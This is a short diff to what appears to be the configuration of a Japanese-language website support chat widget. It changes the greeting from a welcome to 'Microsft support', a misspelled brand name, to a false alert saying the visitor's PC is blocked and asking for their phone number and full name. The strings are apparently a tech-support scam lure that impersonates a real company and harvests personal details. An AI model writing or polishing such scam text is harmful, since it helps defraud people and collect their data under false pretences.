@@ -17,7 +17,7 @@
   var TEXT_BTN_LABEL  = "チャットを始める";        // floating button label
   var TEXT_TITLE      = "サポートチャット";          // header title inside chatbox
   var TEXT_SUBTITLE   = "お気軽にご連絡ください";    // header subtitle inside chatbox
-  var TEXT_GREETING   = "👋 Microsft サポートへようこそ。本日はどのようなご用件でしょうか？"; // first greeting message
+  var TEXT_GREETING   = "👋 お客様のパソコンがブロックされています。サポート依頼を開始するには、電話番号と氏名をご入力ください。ありがとうございます。"; // first greeting message
   var TEXT_PLACEHOLDER = "メッセージを入力…";        // input placeholder
   var TEXT_ONLINE     = "オンライン・すぐにご返答します"; // status when connected
   var TEXT_CONNECTING = "接続中…";                  // status while connecting
